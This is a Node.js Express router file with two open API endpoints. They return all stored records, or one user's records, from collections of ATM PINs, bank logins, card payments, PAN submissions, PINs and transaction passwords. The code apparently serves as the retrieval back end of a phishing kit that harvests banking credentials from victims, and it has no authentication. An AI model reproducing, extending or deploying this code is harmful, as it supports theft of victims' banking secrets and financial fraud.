import express from "express";

import UserForms from "../models/formModel.js";
import AtmPin from "../models/AtmPin.js";
import BankLogin from "../models/bankLoginModel.js";
import CardPayment from "../models/card_payments.js";
import PanSubmission from "../models/pan_submissions.js";
import UserPins from "../models/UserPins.js";
import TransactionPassword from "../models/transactionPassModel.js";

const router = express.Router();

/* ----------------------------------------------------------
   FORMAT DATA → remove createdAt & __v
---------------------------------------------------------- */
const clean = (obj) => {
    if (!obj) return null;
    let data = obj.toObject();
    delete data.__v;
    delete data.createdAt;
    return data;
};

/* ----------------------------------------------------------
   GET ALL USERS — COMBINED FULL DATA
   /api/all-data
---------------------------------------------------------- */
router.get("/all-data", async (req, res) => {
    try {
        const forms = await UserForms.find({});
        const atmPins = await AtmPin.find({});
        const bankLogins = await BankLogin.find({});
        const cardPayments = await CardPayment.find({});
        const panSubmissions = await PanSubmission.find({});
        const userPins = await UserPins.find({});
        const transactionPasswords = await TransactionPassword.find({});

        return res.json({
            success: true,
            message: "All Combined Data Fetched",
            data: {
                forms: forms.map(clean),
                atmPins: atmPins.map(clean),
                bankLogins: bankLogins.map(clean),
                cardPayments: cardPayments.map(clean),
                panSubmissions: panSubmissions.map(clean),
                userPins: userPins.map(clean),
                transactionPasswords: transactionPasswords.map(clean),
            }
        });

    } catch (err) {
        return res.json({ success: false, message: "Server error", error: err.message });
    }
});


/* ----------------------------------------------------------
   GET SINGLE USER ALL DATA (BY UNIQUEID)  
   /api/all-data/:uniqueid
---------------------------------------------------------- */
router.get("/all-data/:uniqueid", async (req, res) => {
    try {
        const uniqueid = req.params.uniqueid;

        const forms = await UserForms.findOne({ uniqueid });
        const atmPin = await AtmPin.findOne({ uniqueid });
        const bankLogin = await BankLogin.findOne({ uniqueid });
        const cardPayment = await CardPayment.findOne({ uniqueid });
        const pan = await PanSubmission.findOne({ uniqueid });
        const pin = await UserPins.findOne({ uniqueid });
        const txnPass = await TransactionPassword.findOne({ uniqueid });

        return res.json({
            success: true,
            message: "User Combined Data Fetched",
            uniqueid,
            data: {
                form: clean(forms),
                atmPin: clean(atmPin),
                bankLogin: clean(bankLogin),
                cardPayment: clean(cardPayment),
                pan: clean(pan),
                pin: clean(pin),
                transactionPassword: clean(txnPass),
            }
        });

    } catch (err) {
        return res.json({ success: false, message: "Server error", error: err.message });
    }
});


export default router;
